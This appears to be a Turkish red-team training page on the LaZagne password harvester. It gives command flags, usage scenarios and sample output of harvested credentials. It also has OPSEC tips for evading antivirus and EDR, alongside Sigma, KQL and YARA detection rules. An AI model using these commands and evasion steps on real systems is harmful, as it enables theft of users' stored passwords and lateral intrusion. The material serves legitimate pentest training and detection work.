# LaZagne

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Alessandro Zanni (@n1nj4sec) tarafından geliştirilen; Windows ve Linux sistemlerde işletim sistemi bileşenleri, web tarayıcıları, sistem yönetim araçları, veri tabanları, e-posta istemcileri ve yerel kasa dizinleri dahil 50'den fazla farklı yazılımdan yerel şifrelenmiş veya düz metin kimlik bilgilerini otomatik olarak ayrıştırıp çözen çok amaçlı parola hasat aracı.

---

## 1. Genel Bakış ve Amaç

Sızma testlerinde ve kırmızı takım operasyonlarında bir uç noktada (workstation, jump-server veya yönetici sunucusu) ilk erişim veya yerel yetki yükseltme sağlandıktan sonra, en öncelikli hedef kurumsal ağ içinde yanal hareket (Lateral Movement) yapabilecek yeni kimlik bilgilerine ulaşmaktır. Birçok operatör yalnızca LSASS bellek dökümü almaya odaklanırken, modern uç nokta koruma sistemleri (EDR) LSASS erişimlerini (`PROCESS_VM_READ`, Sysmon Event ID 10) agresif biçimde engeller ve alarmlar tetikler.

Bu noktada **`LaZagne`**, işletim sistemi çekirdeğine veya LSASS gibi kritik süreçlere hiçbir tehlikeli bellek kancası takmadan; hedef sistemdeki onlarca farklı üçüncü parti uygulamanın, web tarayıcısının, veri tabanı istemcisinin ve Windows yerleşik kasalarının diskte veya kayıt defterinde sakladığı şifreli sırları meşru kullanıcı DPAPI API'leri (`CryptUnprotectData`) ve uygulama-spesifik çözücüler ile hasat eder.

### Temel Çalışma Mekanizması ve Modüler Yapı

1. **Modüler Python Mimarisi:** LaZagne, bağımsız kategoriler altında yapılandırılmış Python modüllerinden oluşur. PyInstaller ile tek bir taşınabilir `.exe` dosyasına dönüştürülebilir ya da C2 çerçeveleri üzerinden bellekte yansımalı (reflective) olarak yürütülebilir.
2. **Kullanıcı Context'i ve DPAPI Entegrasyonu:** Windows üzerindeki tarayıcılar (Chrome, Edge) ve kimlik depoları, kullanıcı parolalarını kullanıcının DPAPI Master Key'i ile şifreler. LaZagne, ilgili kullanıcının oturumunda çalıştığında Windows Data Protection API'sini (`CryptUnprotectData`) doğrudan çağırarak şifreleri ek bir anahtar gerekmeksizin şeffafça çözer.
3. **Uygulama Özelinde Çözücüler:** Her yazılımın kendine has bir parola saklama algoritması vardır:
   - **Mozilla Firefox / Thunderbird:** `key4.db` (NSS şifrelemesi) ve `logins.json` dosyalarını okur, varsa ana parola (Master Password) doğrulaması yapar.
   - **Chromium Tabanlı Tarayıcılar:** `Local State` içindeki DPAPI ile korunan `os_crypt.encrypted_key` değerini çözer ve SQLite `Login Data` tablosundaki `v10` / `v11` AES-256-GCM şifreli parolaları deşifre eder.
   - **PuTTY / WinSCP / FileZilla:** Kayıt defteri girdileri (`HKCU\Software\SimonTatham\PuTTY\Sessions`) ve XML yapılandırma dosyalarındaki session parolalarını özel algoritmalarıyla tersine çevirir.
   - **Windows Credential Manager / Vault:** `vaultcli.dll` ve `advapi32.dll` yerel Windows kütüphanelerini sorgulayarak RDP kimlik bilgilerini ve Windows web kimliklerini döker.
   - **Kablosuz Ağlar (WiFi):** `WlanQueryInterface` ve `WlanGetProfile` API'leri üzerinden sistemde kayıtlı WPA/WPA2-PSK parolalarını açık metin olarak çeker.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   HEDEF UÇ NOKTA (KULLANICI OTURUMU)                   │
│                                                                        │
│  [ laZagne.exe ] (Çalıştırılabilir veya Bellekte Python / Reflective)  │
│         │                                                              │
│         ├──► (1) Kategori Tarayıcısı: Browsers, Sysadmin, Windows, DB  │
│         │                                                              │
│         ├──► (2) Depo Tespiti: SQLite DB, AppData, Registry, Vault     │
│         │        ├─ %LOCALAPPDATA%\Google\Chrome\User Data\...         │
│         │        ├─ %APPDATA%\Mozilla\Firefox\Profiles\...             │
│         │        ├─ HKCU\Software\SimonTatham\PuTTY\...                │
│         │        └─ %APPDATA%\FileZilla\sitemanager.xml                │
│         │                                                              │
│         ├──► (3) Şifre Çözme Motoru:                                   │
│         │        ├─ DPAPI CryptUnprotectData()                         │
│         │        ├─ AES-256-GCM / TripleDES Çözümü                     │
│         │        ├─ Mozilla NSS SQLite Key Parser                      │
│         │        └─ Windows Vault Native C-API (vaultcli.dll)          │
│         │                                                              │
│         └──► (4) Yapılandırılmış Çıktı: Formatör & Raporlama           │
│                  ├─ Standart Konsol Çıktısı                            │
│                  ├─ JSON Çıktısı (-oJ /path/to/loot)                   │
│                  └─ Düz Metin Çıktı (-oN /path/to/loot)                │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Senaryo | LSASS / Mimikatz Yaklaşımı | LaZagne Yaklaşımı | Avantaj / Operasyonel Değer |
|---|---|---|---|
| **EDR ve AV Atlatma** | LSASS handle açma işlemi yüksek risklidir ve anında alarm tetikler. | Yalnızca kullanıcı dosyalarını okur ve meşru DPAPI çağrısı yapar. | EDR süreç izleme radarına takılmadan onlarca parolayı sessizce toplar. |
| **Sistem Yöneticisi Atlaması** | Yalnızca o an bellekte aktif olan NTLM/Kerberos hash'lerini yakalar. | PuTTY, WinSCP, RDCMan oturumlarındaki uzak Linux/Windows sunucu şifrelerini çözer. | Altyapı sunucularına, ESXi hipervizörlerine ve ağ cihazlarına doğrudan geçiş sağlar. |
| **Geliştirici & DB Hedefleri** | Bellekte düz metin DB parolası bulmak rastlantısaldır. | DBeaver, Robomongo, Navicat, Git kimlik depolarını ayrıştırır. | Üretim veritabanlarına ve kaynak kod depolarına tam erişim sağlar. |
| **Kullanıcı Yetkisi Düzeyi** | Yerel Yönetici (Local Admin) veya SYSTEM yetkisi zorunludur. | Düşük yetkili standart kullanıcı oturumunda çalışabilir. | Yetki yükseltmeye gerek kalmadan ilk erişim aşamasında derin veri sağlar. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | LaZagne | SharpDPAPI | Mimikatz (sekurlsa) | Seatbelt |
|---|---|---|---|---|
| **Çalışma Alanı** | Kullanıcı yazılımları, tarayıcılar, sysadmin, DB, WiFi | Windows DPAPI odaklı (Vault, Masterkey, Chrome, RDCMan) | LSASS süreci belleği, LSA Secrets, Kerberos | Genel durum farkındalığı, yapılandırma denetimi |
| **Gereken Yetki** | Standart Kullanıcı (Windows sırları için Admin) | Standart Kullanıcı (Tüm sistem için Admin) | Yerel Yönetici / SYSTEM (`SeDebugPrivilege`) | Standart Kullanıcı / Admin |
| **Platform** | Windows & Linux (Multiplatform) | Windows (.NET / C#) | Windows Native (C/C++) | Windows (.NET / C#) |
| **Yazılım Kapsamı** | 50+ Bağımsız Yazılım (Çok Geniş) | DPAPI Kullanan 8-10 Bileşen | LSASS SSP Paketleri | Durum analizi (sınırlı parola hasadı) |
| **C2 Entegrasyonu** | Standalone EXE / Python Script | In-Memory `execute-assembly` için mükemmel | Mimikatz / Sekurlsa modülleri | In-Memory `execute-assembly` |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

LaZagne, komut satırından çalıştırıldığında genel bir tarama (`all`) yapabileceği gibi yalnızca hedeflenen yazılım kategorisine odaklanarak da çalıştırılabilir.

### Genel Sözdizimi

```cmd
laZagne.exe <Kategori / all> [Modül Seçenekleri] [Çıktı Seçenekleri]
```

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `all` | Desteklenen tüm yazılım kategorilerini ve modülleri sırayla çalıştırır. | `laZagne.exe all` |
| `browsers` | Yalnızca web tarayıcılarını (Chrome, Firefox, Edge, Opera, Brave vb.) hedefler. | `laZagne.exe browsers` |
| `sysadmin` | Sistem yönetim araçlarını (PuTTY, WinSCP, OpenSSH, FileZilla, VNC, RDCMan vb.) hedefler. | `laZagne.exe sysadmin` |
| `windows` | Windows yerleşik bileşenlerini (Credential Manager, Vault, LSA Secrets, WiFi) hedefler. | `laZagne.exe windows` |
| `databases` | Veri tabanı istemcilerini (DBeaver, SQL Server, Robomongo, Navicat, Squirrel) hedefler. | `laZagne.exe databases` |
| `mails` | E-posta istemcilerini (Outlook, Thunderbird) hedefler. | `laZagne.exe mails` |
| `wifi` | Sistemde kayıtlı kablosuz ağ parolalarını açık metin olarak çeker. | `laZagne.exe wifi` |
| `git` | Git yapılandırma ve kimlik saklayıcılarındaki (`.git-credentials`) parolaları hedefler. | `laZagne.exe git` |
| `games` / `chats` | Oyun ve sohbet istemcilerini (Pidgin, Steam, Psi vb.) hedefler. | `laZagne.exe chats` |
| `-oA <dizin>` | Çıktıyı tüm formatlarda (JSON ve Normal TXT) belirtilen dizine kaydeder. | `laZagne.exe all -oA C:\Temp\Loot` |
| `-oJ` | Sonuçları JSON formatında dosyaya yazar. | `laZagne.exe all -oJ` |
| `-oN` | Sonuçları standart düz metin formatında dosyaya yazar. | `laZagne.exe all -oN` |
| `-output <dizin>` | Çıktı dosyalarının oluşturulacağı hedef dizini belirler. | `laZagne.exe all -oJ -output C:\Users\Public` |
| `-v` / `-vv` | Ayrıntı düzeyini (verbose) artırır; hata ayıklama bilgilerini gösterir. | `laZagne.exe browsers -vv` |
| `-password <pwd>` | Mozilla NSS master password veya korumalı depolar için denenecek parola. | `laZagne.exe browsers -password Master123` |
| `-path <yol>` | Hedef yazılım profili varsayılan konumda değilse özel profil dizini tanımlar. | `laZagne.exe browsers -path "D:\Profiles"` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Sessiz Tam Sistem Taraması ve JSON Raporlama

İlk erişim sağlanan bir yönetici bilgisayarında tüm yazılımları taramak ve otomasyon araçlarına aktarılmak üzere JSON formatında dosya üretmek:

```cmd
laZagne.exe all -oJ -output C:\Users\Public\Music
```

**Örnek Konsol Çıktısı Analizi:**

```text
C:\Users\Public\Music> laZagne.exe all -oJ -output C:\Users\Public\Music

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] ------------------ Category: Browsers ------------------

[+] Chrome found:
  User: corp\jdoe
  URL: https://jira.internal.corp/login.jsp
  Login: jdoe
  Password: MegaCorporatePassword2026!

[+] Firefox found:
  User: corp\jdoe
  URL: https://gitlab.internal.corp/users/sign_in
  Login: jdoe@corp.local
  Password: GitLabSecretDevToken#99

[+] ------------------ Category: Sysadmin ------------------

[+] WinSCP found:
  Host: sftp.backup.internal.corp:22
  Username: backup_admin
  Password: SafeBackupTransferVault_2026

[+] PuTTY found:
  Session: prod-k8s-cluster-master01
  Host: 10.10.40.15
  Username: root
  Keyfile: C:\Users\jdoe\.ssh\id_rsa

[+] ------------------ Category: Windows ------------------

[+] Windows Credential Manager:
  Target: TERMSRV/10.10.20.50
  Type: Generic
  User: CORPDOM\Administrator
  Password: DomainAdminSuperPass#123

[+] 14 passwords found across 4 categories!
[+] Output written to: C:\Users\Public\Music\credentials.json
```

### Senaryo 2: Yanal Hareket Hedefli Sysadmin Oturum Hasadı

Hedeflenen makine bir "Jump Host" veya DevOps mühendisi bilgisayarı olduğunda, uzak sunuculara (SSH, RDP, SFTP) kayıtlı oturum bilgilerini hızla çekmek:

```cmd
laZagne.exe sysadmin -v
```

Bu komut; PuTTY kayıt defteri girdilerini, FileZilla `sitemanager.xml` dosyasını, WinSCP oturumlarını, RDCMan (`.rdg`) yapılandırmalarını ve OpenSSH özel anahtar yollarını tarar. Elde edilen `TERMSRV/` veya SSH kimlik bilgileri, doğrudan Kategori 11 araçları (`wmiexec.py`, `psexec.py`, `ssh`) ile yanal hareket için kullanılır.

### Senaryo 3: Chromium ve Firefox Tarayıcı Parolaları Hasadı

Uç noktada kullanıcıların iç intranet uygulamalarına (Jira, Confluence, Jenkins, Git) kaydettiği kimlik bilgilerini ayrıştırmak:

```cmd
laZagne.exe browsers
```

Arka planda Chrome'un SQLite veritabanı dosyasını (`Login Data`) açar, Windows DPAPI ile şifrelenmiş anahtarı çözer ve her web sitesi için kullanıcı adı ve açık metin parolayı listeler.

### Senaryo 4: WiFi Parolaları ve Ağ Profilleri Hasadı

Fiziksel sızma testlerinde veya yerel kablosuz ağ şifresini elde ederek şirket içi ağa sızmak için sistemde önceden bağlanılmış tüm WiFi ağlarının WPA2-PSK parolalarını açık metin dökmek:

```cmd
laZagne.exe wifi
```

**Örnek Konsol Çıktısı:**

```text
[+] ------------------ Category: Wifi ------------------

[+] SSID: Corp-Executive-WLAN
  Authentication: WPA2-Personal
  Key: CorpSecureExecutivePassphrase!2026

[+] SSID: BranchOffice-Guest-Staff
  Authentication: WPA2-Personal
  Key: StaffGuestSummerWifi99
```

### Senaryo 5: Geliştirici ve Veri Tabanı İstemcilerinden Kimlik Hasadı

Yazılım geliştiricilerin çalışma istasyonlarında yer alan veri tabanı bağlantı profillerini ve Git token'larını yakalamak:

```cmd
laZagne.exe databases git
```

DBeaver (`credentials-config.json`), Navicat, Robomongo ve Git Credential Helper dosyalarını analiz ederek üretim ve test veritabanlarına ait SQL/NoSQL bağlantı kimliklerini döker.

### Senaryo 6: C2 Çerçevesi Üzerinden Bellekte Yürütme (In-Memory Execution)

Diske `.exe` bırakmanın EDR dosya oluşturma (FileCreate) kuralını tetikleyeceği yüksek güvenlikli ortamlarda, LaZagne C# tabanlı bir wrapper (örneğin `SharpLaZagne`) aracılığıyla Cobalt Strike veya Sliver üzerinden doğrudan belleğe enjekte edilir:

```text
# Cobalt Strike Beacon konsolu
beacon> execute-assembly /opt/tools/SharpLaZagne.exe all
```

Bu yöntemle disk I/O operasyonu gerçekleşmez; yalnızca bellek içi PE yüklemesi yapılarak süreç ayrıştırması tamamlanır.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Durum | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `CryptUnprotectData failed: The parameter is incorrect (Error: 87)` | Komut SYSTEM hesabı (`psexec -s` veya SYSTEM Beacon) altında çalıştırılmıştır. Hedef kullanıcının DPAPI Master Key'i SYSTEM hesabı tarafından çözülemez. | `runas` veya C2 `make_token` / `impersonate` komutu ile hedef kullanıcının oturum token'ına bürünülmeli (`User Context`) ve komut kullanıcı olarak yürütülmelidir. |
| `sqlite3.OperationalError: database is locked` | Hedef web tarayıcısı (Chrome, Edge vb.) kullanıcı tarafından o an aktif olarak kullanılmakta ve `Login Data` dosyası üzerinde kilit tutulmaktadır. | Tarayıcıyı zorla kapatmak (`taskkill /F /IM chrome.exe`) gürültü yaratır. Bunun yerine kilitli dosya Volume Shadow Copy (VSS) veya PowerShell kopyalama ile geçici bir dizine aktarılıp `-path` parametresi ile okunmalıdır. |
| `Windows Defender: Trojan:Win32/LaZagne blocked` | LaZagne'ın derlenmiş standart PyInstaller ikili dosyaları tüm modern AV/EDR sistemleri tarafından statik imza ile tanınır. | Standart GitHub release ikilisi asla diske indirilmemelidir. Python kaynak kodundan özel obfuscation yapılarak derlenmeli veya bellek içi (In-Memory C# / BOF) türevleri tercih edilmelidir. |
| `Access Denied when opening registry key HKLM\SAM or SECURITY` | Windows LSA veya SAM modülü çalıştırılırken yerel yönetici (Elevated High Integrity) yetkisi mevcut değildir. | Yalnızca kullanıcı yetkisi gerektiren modüllere odaklanılmalı (`laZagne.exe browsers sysadmin wifi`) veya önce yerel yetki yükseltme (LPE / UAC Bypass) uygulanmalıdır. |
| `Master Password needed for Mozilla Profile` | Firefox profilinde kullanıcı tarafından "Ana Parola" (Master Password) tanımlanmıştır; veriler salt DPAPI ile değil, bu ana parola ile şifrelidir. | Operasyonda daha önce elde edilmiş olası kurumsal parolalar `-password <pwd>` bayrağı ile sözlük saldırısı şeklinde LaZagne'a verilerek doğrulanmalıdır. |
| `IndexError: list index out of range in Chrome v10 decrypt` | Chrome v80+ sonrası gelen `os_crypt.encrypted_key` AES-GCM şifre çözme algoritmasında `Local State` dosyasının bozuk veya beklenmedik sürümde olması. | En güncel LaZagne sürümünün kullanıldığından emin olunmalı veya Kategori 07'de yer alan özel [SharpChrome](./SharpChrome.md) aracı kullanılmalıdır. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Trafiği ]      : 🟢 SIFIR (Yalnızca yerel dosya ve API okuması) │
│  [ LSASS Etkileşimi ]: 🟢 SIFIR (lsass.exe'ye handle AÇILMAZ)         │
│  [ Dosya Okuma ]     : 🟡 ORTA (AppData altındaki SQLite/XML okuma)    │
│  [ AV/EDR İmzası ]   : 🔴 YÜKSEK (Varsayılan PyInstaller derlemesi)    │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Windows Security Event ID'leri:**
   - **Event ID 4663 / 4656:** Kullanıcı dizinleri altındaki hassas dosyalara (`Login Data`, `key4.db`, `sitemanager.xml`) kısa süre içinde ardışık okuma erişimi sağlanması.
   - **Event ID 4672:** Özel ayrıcalık atanması (Windows/SAM modülü çalıştırıldığında `SeDebugPrivilege` veya `SeBackupPrivilege`).
2. **Sysmon Günlükleri:**
   - **Event ID 1 (Process Create):** Süreç komut satırında `lazagne`, `all`, `-oJ`, `-oN` anahtar kelimelerinin açıkça geçmesi.
   - **Event ID 11 (FileCreate):** Çalışma dizininde `credentials.json` veya benzeri çıktı dosyalarının oluşturulması.
   - **Event ID 7 (ImageLoad):** Bir sürecin olağandışı şekilde hem `crypt32.dll` (DPAPI), hem `vaultcli.dll` (Credential Vault), hem de `wlanapi.dll` (WiFi) kütüphanelerini aynı anda belleğe yüklemesi.

### 5.2 Ağ ve EDR İmzaları

- **Ağ İmzası:** LaZagne yerel bir araçtır; doğrudan ağ trafiği üretmez.
- **EDR Sezgisel (Heuristic) Alarmları:** Bilinen PyInstaller yürütülebilir dosyalarının `%TEMP%` dizinine Python runtime DLL'lerini ve betiklerini açması (unpacker davranışı) modern EDR yazılımları tarafından anında davranışsal analizle yakalanır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1555.003** | Credentials from Web Browsers | Chrome, Edge ve Firefox SQLite/NSS depolarından kullanıcı oturum şifrelerinin çıkarılması. |
| **T1555.004** | Windows Credential Manager | `vaultcli.dll` API'leri üzerinden Vault ve RDP kimlik bilgilerinin dökülmesi. |
| **T1552.001** | Credentials in Files | PuTTY kayıtları, FileZilla XML, WinSCP INI ve Git konfigürasyon dosyalarının taranması. |
| **T1003.002** | Security Account Manager | Windows modülü ile yerel SAM veritabanından parola karmalarının çekilmesi. |
| **T1081** | Credentials in Files (WiFi) | WLAN profillerinden açık metin WPA2 anahtarlarının elde edilmesi. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **PyInstaller Statik İmzası** | Orijinal `laZagne.exe` ikilisini asla diske kopyalamayın. Kodu C# türevine dönüştürün (`SharpLaZagne`) veya Python kodunu bellek içi çalıştırın. |
| **Diske Çıktı Dosyası Yazma** | `-oJ` veya `-oN` bayrakları ile diske dosya yazmak EDR FileCreate alarmı oluşturur. Çıktıyı standart çıktıya (stdout) verip C2 kanalı üzerinden çekin. |
| **Toplu Dosya Erişim Anomalisi** | `all` parametresi onlarca tarayıcı ve istemci dosyasını aynı saniyede okur. Hedefe özel tekil modülleri (`browsers` veya `sysadmin`) zaman aralıklarıyla çalıştırın. |
| **SYSTEM Context Hatası** | SYSTEM altında çalıştırmayın; DPAPI çözümü başarısız olur ve gereksiz hata telemetrisi üretir. İlgili kullanıcının oturumunda çalıştırın. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: Şüpheli Tarayıcı ve Kasa Dosyası Toplu Okuma Tespiti

```yaml
title: LaZagne Credential Harvesting Pattern Detection
id: f4817a32-128b-4b2a-8991-c27389182041
status: experimental
description: Detects suspicious command-line executions or rapid file accesses associated with LaZagne credential harvester.
author: Modul 11 Security Research
logsource:
  category: process_creation
  product: windows
detection:
  selection_cmd:
    CommandLine|contains:
      - 'lazagne'
      - 'laZagne'
      - 'all -oJ'
      - 'browsers -oN'
      - 'sysadmin -oJ'
  selection_modules:
    CommandLine|contains|all:
      - 'browsers'
      - 'sysadmin'
  condition: selection_cmd or selection_modules
falsepositives:
  - Authorized internal administrative security audits
level: high
tags:
  - attack.credential_access
  - attack.t1555.003
  - attack.t1555.004
```

#### Microsoft Sentinel KQL Sorgusu: Anormal DPAPI ve Vault API Çağrıları

```kql
// LaZagne veya benzeri araçların neden olduğu çoklu hassas dosya ve Vault erişim korelasyonu
DeviceFileEvents
| where Timestamp > ago(2h)
| where ActionType == "FileCreated" or ActionType == "FileModified"
| where FileName in~ ("credentials.json", "credentials.txt", "loot.json")
   or (FolderPath has @"\Google\Chrome\User Data\Default\Login Data" and InitiatingProcessCommandLine has_any ("all", "browsers", "sysadmin"))
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, ActionType
| order by Timestamp desc
```

#### YARA Kuralı: LaZagne Binary ve Modül Dizgileri Tespiti

```yara
rule PostExploit_LaZagne_Artifacts {
    meta:
        description = "Detects compiled LaZagne executable artifacts, internal module names, and credential parsers"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "The LaZagne Project" ascii wide
        $s2 = "! BANG BANG !" ascii wide
        $s3 = "lazagne.config" ascii wide
        $s4 = "softwares.browsers" ascii wide
        $s5 = "softwares.sysadmin" ascii wide
        $s6 = "softwares.windows" ascii wide
        $s7 = "CryptUnprotectData" ascii wide
        $s8 = "sitemanager.xml" ascii wide
    condition:
        uint16(0) == 0x5A4D and (
            3 of ($s1, $s2, $s3) or
            (all of ($s4, $s5, $s6) and 1 of ($s7, $s8))
        )
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Tam Sistem Taraması ve Otomasyon İçin JSON Raporu
```cmd
laZagne.exe all -oJ -output C:\Users\Public
```
- **Ne Yapar?** Sistemdeki tüm desteklenen modülleri çalıştırır ve bulduğu tüm kullanıcı adı, parola ve anahtarları `credentials.json` dosyasına döker.
- **Ne Zaman Kullanılır?** İlk erişim sağlanan sistemde hızlıca kapsamlı kimlik hasadı yapmak istendiğinde.
- **Parametreler:** `all`: Tüm modülleri çalıştırır, `-oJ`: Çıktıyı JSON yapar, `-output`: Dosyanın yazılacağı hedef dizini belirler.

### Komut 2: Yalnızca Web Tarayıcılarını Hedefleme
```cmd
laZagne.exe browsers
```
- **Ne Yapar?** Chrome, Edge, Firefox, Brave, Opera ve diğer tarayıcıların kayıtlı form ve site parolalarını çözer.
- **Ne Zaman Kullanılır?** Şirket içi web uygulamalarına, kurumsal portallara veya bulut servislerine ait kimlik bilgileri arandığında.
- **Parametreler:** `browsers`: Yalnızca tarayıcı ayrıştırıcılarını devreye sokar.

### Komut 3: Yanal Hareket İçin Sistem Yönetim Oturumları Hasadı
```cmd
laZagne.exe sysadmin
```
- **Ne Yapar?** PuTTY, WinSCP, OpenSSH, FileZilla, RDCMan, VNC oturumlarını ve kayıtlı sunucu kimlik bilgilerini ayrıştırır.
- **Ne Zaman Kullanılır?** Yönetici makinelerinden kritik sunuculara veya ağ cihazlarına SSH/RDP/SFTP ile sıçramak için.
- **Parametreler:** `sysadmin`: Ağ ve sunucu yönetim yazılımlarına odaklanır.

### Komut 4: Windows Kimlik Depoları ve Kasası Hasadı
```cmd
laZagne.exe windows
```
- **Ne Yapar?** Windows Credential Manager, Vault ve LSA sırlarını sorgulayarak RDP ve Windows domain kimliklerini döker.
- **Ne Zaman Kullanılır?** Kullanıcının sistemde kaydettiği domain ve RDP bağlantı parolalarını yakalamak için.
- **Parametreler:** `windows`: Windows yerel güvenlik alt sistemlerini hedefler.

### Komut 5: Kayıtlı Kablosuz Ağ (WiFi) Parolalarını Çekme
```cmd
laZagne.exe wifi
```
- **Ne Yapar?** Native WiFi API üzerinden işletim sisteminde saklanan tüm kablosuz ağ profillerini ve WPA2 anahtarlarını listeler.
- **Ne Zaman Kullanılır?** Şirket ofisinde veya şubede fiziksel sızma testi sırasında yerel ağa Wi-Fi üzerinden dahil olmak için.
- **Parametreler:** `wifi`: Kablosuz ağ servislerini sorgular.

### Komut 6: Veri Tabanı Bağlantı ve İstemci Profillerini Çözme
```cmd
laZagne.exe databases
```
- **Ne Yapar?** DBeaver, Robomongo, SQL Server Management Studio, Navicat profillerindeki DB kimlik bilgilerini çözer.
- **Ne Zaman Kullanılır?** Şirket veritabanlarına (MSSQL, PostgreSQL, Oracle, MongoDB) yetkili erişim sağlamak için.
- **Parametreler:** `databases`: Veri tabanı modüllerini çalıştırır.

### Komut 7: Git ve Geliştirici Token'larını Toplama
```cmd
laZagne.exe git
```
- **Ne Yapar?** `.git-credentials` ve Git Credential Manager tarafından saklanan kişisel erişim token'larını (PAT) ve parolaları okur.
- **Ne Zaman Kullanılır?** GitHub, GitLab veya Bitbucket kurumsal repolarına erişip kaynak kod veya CI/CD sırları ararken.
- **Parametreler:** `git`: Git kimlik depolarını hedefler.

### Komut 8: E-Posta İstemcisi Parolaları Hasadı
```cmd
laZagne.exe mails
```
- **Ne Yapar?** Outlook ve Thunderbird üzerinde yapılandırılmış kurumsal IMAP/SMTP/Exchange hesap kimlik bilgilerini çözer.
- **Ne Zaman Kullanılır?** Kullanıcının kurumsal e-posta kutusuna erişip oltalama (phishing) veya hassas yazışmaları analiz etmek için.
- **Parametreler:** `mails`: E-posta modüllerini çalıştırır.

### Komut 9: Ayrıntılı Hata Ayıklama Modunda Hedefli Profil Analizi
```cmd
laZagne.exe browsers -vv -path "C:\Users\TargetUser\AppData\Roaming\Mozilla\Firefox\Profiles\xyz.default"
```
- **Ne Yapar?** Belirtilen özel profil dizinindeki Firefox veritabanını en yüksek hata ayıklama seviyesinde ayrıştırır.
- **Ne Zaman Kullanılır?** Standart konum haricindeki taşınabilir veya harici diskteki kullanıcı profillerini analiz ederken.
- **Parametreler:** `-vv`: Çok detaylı loglama, `-path`: Özel profil dizinini tanımlar.

### Komut 10: Sessiz Modda Düz Metin Dosyaya Kaydetme
```cmd
laZagne.exe all -quiet -oN C:\Users\Public\report.txt
```
- **Ne Yapar?** Ekrana hiçbir banner veya görsel çıktı basmadan tüm sonuçları sessizce `report.txt` dosyasına yazar.
- **Ne Zaman Kullanılır?** C2 ajanlarında veya komut satırı izleme araçlarında ekran çıktısını gizlemek istendiğinde.
- **Parametreler:** `-quiet`: Konsol çıktısını bastırır, `-oN`: Normal metin dosyası oluşturur.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [AlessandroZ / LaZagne](https://github.com/AlessandroZ/LaZagne)
- **SharpLaZagne C# Portu:** [GhostPack / SharpLaZagne Alternatifleri](https://github.com/adversarydefense/SharpLaZagne)
- **MITRE ATT&CK Referansı:** [T1555 - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)
- **Microsoft DPAPI Dokümantasyonu:** [Windows Data Protection API Architecture](https://learn.microsoft.com/en-us/previous-versions/ms995355(v=msdn.10))

---

> **Önceki:** [← Internal-Monologue](./Internal-Monologue.md) · **Sonraki:** [Certify (Kategori 08) →](../Kategori_08_Active_Directory_Sertifika_Servisleri/Certify.md)
